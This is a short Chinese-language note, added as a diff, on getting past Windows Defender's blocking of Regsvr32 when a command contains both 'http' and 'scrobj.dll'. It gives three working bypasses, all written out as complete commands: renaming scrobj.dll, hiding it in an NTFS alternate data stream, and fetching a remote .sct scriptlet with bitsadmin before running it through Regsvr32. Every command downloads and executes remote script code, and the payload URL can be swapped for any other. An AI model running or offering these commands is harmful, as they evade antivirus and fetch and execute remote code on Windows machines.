@@ -1,0 +1,18 @@
+Defender杀
+Regsvr32的命令中同时出现http和scrobj.dll这两个关键字
+
+第一种方法
+将C:\Windows\System32\scrobj.dll复制一份为test.dll
+然后这样执行命令：
+Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct test.dll
+
+
+第二种方法
+将C:\Windows\System32\scrobj.dll写入ADS文件流
+type C:\Windows\System32\scrobj.dll > test.txt:yy
+然后这样执行命令：
+Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct test.txt:yy
+
+第三种方法
+使用bitsadmin下载sct到本地然后执行
+bitsadmin /transfer download /download /priority normal https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct %TEMP%\test.txt && regsvr32.exe /s /u /i:%TEMP%\test.txt scrobj.dll
